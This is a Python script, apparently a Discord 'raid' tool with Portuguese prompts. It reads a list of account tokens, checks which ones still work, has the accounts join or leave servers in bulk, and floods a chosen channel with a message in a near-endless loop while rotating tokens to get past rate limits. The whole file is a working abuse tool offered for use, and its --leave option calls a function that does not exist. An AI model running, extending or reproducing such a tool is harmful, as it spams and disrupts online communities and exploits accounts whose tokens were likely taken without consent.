#!/usr/bin/env python3
import requests
import os
import time
import platform
from colorama import Fore
import sys
import random

platform = platform.system()
menu = sys.argv[1::]

if platform == 'Windows':
    os.system('cls')
else:
    os.system('clear')


def help():
    print(f'''{Fore.LIGHTRED_EX}
 _____           _   __ ______      _     _
|  _  \         | | / / | ___ \    (_)   | |
| | | |__ _ _ __| |/ /  | |_/ /__ _ _  __| |
| | | / _` | '__|    \  |    // _` | |/ _` |
| |/ / (_| | |  | |\  \ | |\ \ (_| | | (_| |
|___/ \__,_|_|  \_| \_/ \_| \_\__,_|_|\__,_|

{Fore.LIGHTRED_EX}        ╔═════════════════════════╗
        ║{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTRED_EX}║
        ║{Fore.LIGHTWHITE_EX} Version 1.5             {Fore.LIGHTRED_EX}║
        ╚═════════════════════════╝

Como Usar:

    -h            Help da Tool
    --help        Help da Tool

    --check       Checar Tokens

    --join        Entrar num Servidor

    --leave       Sair de um Servidor

    --attack      Raidar um Servidor
    ''')


def attack():
    print(f'''{Fore.LIGHTRED_EX}
 _____           _   __ ______      _     _
|  _  \         | | / / | ___ \    (_)   | |
| | | |__ _ _ __| |/ /  | |_/ /__ _ _  __| |
| | | / _` | '__|    \  |    // _` | |/ _` |
| |/ / (_| | |  | |\  \ | |\ \ (_| | | (_| |
|___/ \__,_|_|  \_| \_/ \_| \_\__,_|_|\__,_|

{Fore.LIGHTRED_EX}        ╔═════════════════════════╗
        ║{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTRED_EX}║
        ║{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTRED_EX}║
        ╚═════════════════════════╝
    ''')

    #f = open('tokens.txt', 'r')
    f = open('tokens.txt').read().splitlines()
    #tk = f.readlines()
    id = input(
        f'{Fore.LIGHTRED_EX}ID do Canal onde vai ser Raidado: {Fore.LIGHTWHITE_EX}')
    msg = input(f'{Fore.LIGHTRED_EX}Mensagem da Raid: {Fore.LIGHTWHITE_EX}')

    api = f'https://discord.com/api/v8/channels/{id}/messages'
    print('')

    #tokens = token.replace('\n', '')

    for x in range(1000000000000):
        tokens = random.choice(f)

        payload = {
            'content': msg
        }

        header = {
            'authorization': tokens
        }
        r = requests.post(api, data=payload, headers=header)

        if r.status_code == 200:
            print(f'{Fore.LIGHTGREEN_EX}[+] Raindando')

        if r.status_code == 429:
            print(f'{Fore.LIGHTYELLOW_EX}[!] Aguardando 3 segundos pra Raidar')
            time.sleep(3)


def join_server():
    print(f'''{Fore.LIGHTRED_EX}
 _____           _   __ ______      _     _
|  _  \         | | / / | ___ \    (_)   | |
| | | |__ _ _ __| |/ /  | |_/ /__ _ _  __| |
| | | / _` | '__|    \  |    // _` | |/ _` |
| |/ / (_| | |  | |\  \ | |\ \ (_| | | (_| |
|___/ \__,_|_|  \_| \_/ \_| \_\__,_|_|\__,_|

{Fore.LIGHTRED_EX}        ╔═════════════════════════╗
        ║{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTRED_EX}║
        ║{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTRED_EX}║
        ╚═════════════════════════╝
    ''')

    f = open('tokens.txt', 'r')
    tk = f.readlines()

    api = 'https://discord.com/api/v8/invites/'
    id_server = input(
        f'{Fore.LIGHTRED_EX}ID do convite do servidor (ex 2ZRubYhv): {Fore.LIGHTWHITE_EX}')
    print('')

    for token in tk:
        tokens = token.replace('\n', '')

        header = {
            'authorization': tokens
        }

        r = requests.post(api + id_server, headers=header)

        if r.status_code == 200:
            print(f'{Fore.LIGHTGREEN_EX}[+] Um bot entrou no servidor')

        if r.status_code == 403:
            print(f'{Fore.LIGHTGREEN_EX}[-] Token invalido')


def leave_server():
    print(f'''{Fore.LIGHTRED_EX}
 _____           _   __ ______      _     _
|  _  \         | | / / | ___ \    (_)   | |
| | | |__ _ _ __| |/ /  | |_/ /__ _ _  __| |
| | | / _` | '__|    \  |    // _` | |/ _` |
| |/ / (_| | |  | |\  \ | |\ \ (_| | | (_| |
|___/ \__,_|_|  \_| \_/ \_| \_\__,_|_|\__,_|

{Fore.LIGHTRED_EX}        ╔═════════════════════════╗
        ║{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTRED_EX}║
        ║{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTRED_EX}║
        ╚═════════════════════════╝
    ''')

    f = open('tokens.txt', 'r')
    tk = f.readlines()

    api = 'https://discord.com/api/v8/users/@me/guilds/'
    id_server = input(
        f'{Fore.LIGHTRED_EX}ID do servidor: {Fore.LIGHTWHITE_EX}')
    print('')

    for token in tk:
        tokens = token.replace('\n', '')

        header = {
            'authorization': tokens
        }

        r = requests.delete(api + id_server, headers=header)

        if r.status_code == 204:
            print(f'{Fore.LIGHTGREEN_EX}[+] Um bot saiu do servidor')
        else:
            print(f'{Fore.LIGHTRED_EX}[-] Algo deu errado')


def check_tokens():
    print(f'''{Fore.LIGHTRED_EX}
 _____           _   __ ______      _     _
|  _  \         | | / / | ___ \    (_)   | |
| | | |__ _ _ __| |/ /  | |_/ /__ _ _  __| |
| | | / _` | '__|    \  |    // _` | |/ _` |
| |/ / (_| | |  | |\  \ | |\ \ (_| | | (_| |
|___/ \__,_|_|  \_| \_/ \_| \_\__,_|_|\__,_|

{Fore.LIGHTRED_EX}        ╔═════════════════════════╗
        ║{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTRED_EX}║
        ║{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTRED_EX}║
        ╚═════════════════════════╝

''')

    f = open('tokens.txt', 'r')
    tk = f.readlines()
    valid_tokens = open('valid_tokens.txt', 'a')

    api = 'https://discord.com/api/v8/users/@me'
    print(f'{Fore.LIGHTBLUE_EX}[*] {Fore.LIGHTRED_EX}Checking Tokens...')
    print('')

    for token in tk:
        tokens = token.replace('\n', '')

        header = {
            'authorization': tokens
        }
        r = requests.get(api, headers=header).text

        if 'email' in r:
            print(f'{Fore.LIGHTGREEN_EX}[+] Funcionando: {token}')
            valid_tokens.write(token)
        else:
            print(f'{Fore.LIGHTRED_EX}[-] Nao Funciona: {token}')


if __name__ == '__main__':
    if menu[0] == '--help':
        help()

    elif menu[0] == '-h':
        help()

    if menu[0] == '--join':
        join_server()

    if menu[0] == '--attack':
        attack()

    if menu[0] == '--leave':
        leave()
    if menu[0] == '--check':
        check_tokens()
